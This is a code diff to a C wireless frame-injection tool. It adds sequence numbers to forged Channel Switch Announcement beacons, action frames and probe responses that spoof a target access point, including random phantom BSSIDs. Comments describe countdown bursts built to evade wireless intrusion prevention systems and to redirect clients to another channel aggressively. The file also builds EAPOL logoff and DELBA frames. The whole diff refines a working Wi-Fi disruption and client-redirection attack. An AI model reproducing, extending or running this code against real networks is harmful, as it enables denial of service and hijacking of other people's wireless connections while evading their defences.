@@ -581,10 +581,10 @@ static int mk_ds_ie(uint8_t *b, uint8_t ch) {
 
 /* [FIX 6] cur_ch parameter added to all beacon/probe builders */
 static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
-                         uint8_t cur_ch, uint8_t new_ch, uint8_t count) {
+                         uint8_t cur_ch, uint8_t new_ch, uint8_t count, uint16_t seq) {
   int o = 0;
   o += mk_rt(b + o);
-  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, 0);
+  o += mk_dot11(b + o, FC_BEACON, BCAST, bss, bss, seq);
 
   beacon_fix_t *f = (beacon_fix_t *)(b + o);
   f->ts = htole64(mono_us());
@@ -845,10 +845,10 @@ static int mk_eapol_logoff(uint8_t *b, const uint8_t bss[6],
 }
 
 static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
-                         uint8_t new_ch, uint8_t count) {
+                         uint8_t new_ch, uint8_t count, uint16_t seq) {
   int o = 0;
   o += mk_rt(b + o);
-  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
+  o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, seq);
   b[o++] = 0; 
   b[o++] = 4; 
   
@@ -913,10 +913,10 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
 /* [FIX 8] Probe Response with client MAC parameter */
 static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
                              const uint8_t dst[6], const char *ssid,
-                             uint8_t cur_ch, uint8_t new_ch, uint8_t count) {
+                             uint8_t cur_ch, uint8_t new_ch, uint8_t count, uint16_t seq) {
   int o = 0;
   o += mk_rt(b + o);
-  o += mk_dot11(b + o, FC_PROBERESP, dst, bss, bss, 0); /* [FIX 8] unicast */
+  o += mk_dot11(b + o, FC_PROBERESP, dst, bss, bss, seq); /* [FIX 8] unicast */
 
   beacon_fix_t *f = (beacon_fix_t *)(b + o);
   f->ts = htole64(mono_us());
@@ -1715,7 +1715,7 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   /* [UPGRADE] Build Realistic Countdown Burst for Factory Mode */
   for (int c = 3, idx = 0; c >= 0; c--, idx++) {
       f->csa_beacon[idx].len =
-          mk_csa_beacon(f->csa_beacon[idx].buf, bss, t->ssid, cur_ch, aggressive_redir, c);
+          mk_csa_beacon(f->csa_beacon[idx].buf, bss, t->ssid, cur_ch, aggressive_redir, c, 0);
   }
   f->quiet_beacon.len =
       mk_quiet_beacon(f->quiet_beacon.buf, bss, t->ssid, cur_ch);
@@ -1738,12 +1738,12 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   /* [UPGRADE] Burst Countdown for Action and Probe Response */
   for (int c = 3, idx = 0; c >= 0; c--, idx++) {
       f->csa_action[idx].len =
-          mk_csa_action(f->csa_action[idx].buf, bss, cli, aggressive_redir, c);
+          mk_csa_action(f->csa_action[idx].buf, bss, cli, aggressive_redir, c, 0);
 
       f->probe_resp[idx].len = mk_probe_resp_csa(f->probe_resp[idx].buf, bss, cli, t->ssid,
-                                            cur_ch, aggressive_redir, c);
+                                            cur_ch, aggressive_redir, c, 0);
       f->probe_resp_bc[idx].len = mk_probe_resp_csa(f->probe_resp_bc[idx].buf, bss, BCAST,
-                                               t->ssid, cur_ch, aggressive_redir, c);
+                                               t->ssid, cur_ch, aggressive_redir, c, 0);
   }
 
   f->delba.len = mk_delba(f->delba.buf, bss, cli);
@@ -4232,7 +4232,7 @@ static void *stress_injector_thread(void *arg) {
         /* [UPGRADE] Realistic Countdown Burst to evade WIPS, ending in 0 (immediate) */
         for (int c = 3; c >= 0; c--) {
           len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
-                              (uint8_t)redir, (uint8_t)c);
+                              (uint8_t)redir, (uint8_t)c, seq++);
 
           if (inject_one(sock, tmp, len) > 0) {
             { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
@@ -4271,7 +4271,7 @@ static void *stress_injector_thread(void *arg) {
         for (int c = 3; c >= 0; c--) {
           
           len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
-                                  (uint8_t)redir, (uint8_t)c);
+                                  (uint8_t)redir, (uint8_t)c, seq++);
           if (inject_one(sock, tmp, len) > 0) {
             { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
@@ -4281,7 +4281,7 @@ static void *stress_injector_thread(void *arg) {
 
           
           len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
-                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
+                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c, seq++);
           if (inject_one(sock, tmp, len) > 0) {
             { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
@@ -4294,7 +4294,7 @@ static void *stress_injector_thread(void *arg) {
           uint8_t phantom_bss[6];
           rand_mac(phantom_bss);
           len = mk_probe_resp_csa(tmp, phantom_bss, BCAST, ssid,
-                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
+                                  (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c, seq++);
           if (inject_one(sock, tmp, len) > 0) {
             { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
@@ -4335,7 +4335,7 @@ static void *stress_injector_thread(void *arg) {
         /* [UPGRADE] Realistic Countdown Burst ending in 0 */
         for (int c = 3; c >= 0; c--) {
           
-          len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c);
+          len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c, seq++);
           if (inject_one(sock, tmp, len) > 0) {
             { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
@@ -4344,7 +4344,7 @@ static void *stress_injector_thread(void *arg) {
           }
 
           
-          len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir, (uint8_t)c);
+          len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir, (uint8_t)c, seq++);
           if (inject_one(sock, tmp, len) > 0) {
             { atomic_fetch_add(&g_pkts_sent, 1); local_sent++; }
             sent_for_ap++;
